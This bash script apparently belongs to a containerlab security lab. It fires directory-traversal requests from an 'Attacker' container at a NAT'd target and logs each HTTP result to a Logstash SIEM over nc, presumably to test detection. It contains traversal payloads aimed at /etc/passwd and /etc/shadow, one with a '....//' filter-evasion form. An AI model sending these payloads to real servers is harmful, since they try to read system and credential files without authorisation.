#!/bin/bash
set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/config/variables.sh"

ATTACKER_CONTAINER="clab-${LAB_NAME}-Attacker"
TARGET_BASE_URL="http://${EXT_FW_NAT_IP}:8443"
LOGSTASH_TCP_HOST="${SIEM_LOGSTASH_ETH1_IP%/*}"
LOGSTASH_TCP_PORT="5000"

echo "=== Directory Traversal Test (from Attacker container) ==="
echo "Target: ${TARGET_BASE_URL}"
echo "Logstash TCP: ${LOGSTASH_TCP_HOST}:${LOGSTASH_TCP_PORT}"

if ! docker ps --format '{{.Names}}' | grep -qx "${ATTACKER_CONTAINER}"; then
  echo "[ERROR] Attacker container not running: ${ATTACKER_CONTAINER}"
  exit 1
fi

send_attack_log() {
  local attack_type="$1"
  local http_code="$2"
  docker exec \
    -e LS_HOST="${LOGSTASH_TCP_HOST}" \
    -e LS_PORT="${LOGSTASH_TCP_PORT}" \
    -e ATTACK_TYPE="${attack_type}" \
    -e HTTP_CODE="${http_code}" \
    "${ATTACKER_CONTAINER}" sh -lc '
      MSG=$(printf "{\"log_type\":\"attack\",\"attack_type\":\"%s\",\"http_code\":\"%s\",\"source\":\"attacker\"}\n" "$ATTACK_TYPE" "$HTTP_CODE")
      if command -v timeout >/dev/null 2>&1; then
        timeout 2 sh -lc "printf %s \"$MSG\" | nc -w 1 \"$LS_HOST\" \"$LS_PORT\"" >/dev/null 2>&1 || true
      else
        printf %s "$MSG" | nc -w 1 "$LS_HOST" "$LS_PORT" >/dev/null 2>&1 || true
      fi
    ' >/dev/null 2>&1 || true
}

for path in "../../../../etc/passwd" "../../../etc/shadow" "....//....//etc/passwd"; do
  echo -n "Path: $path → "
  CODE=$(docker exec \
    -e ATTACK_URL="${TARGET_BASE_URL}/${path}" \
    "${ATTACKER_CONTAINER}" sh -lc \
    'curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 --max-time 5 "$ATTACK_URL"' \
    2>/dev/null || echo "000")
  echo "HTTP $CODE"
  send_attack_log "path_traversal" "$CODE"
  sleep 1
done

echo "=== Done ==="
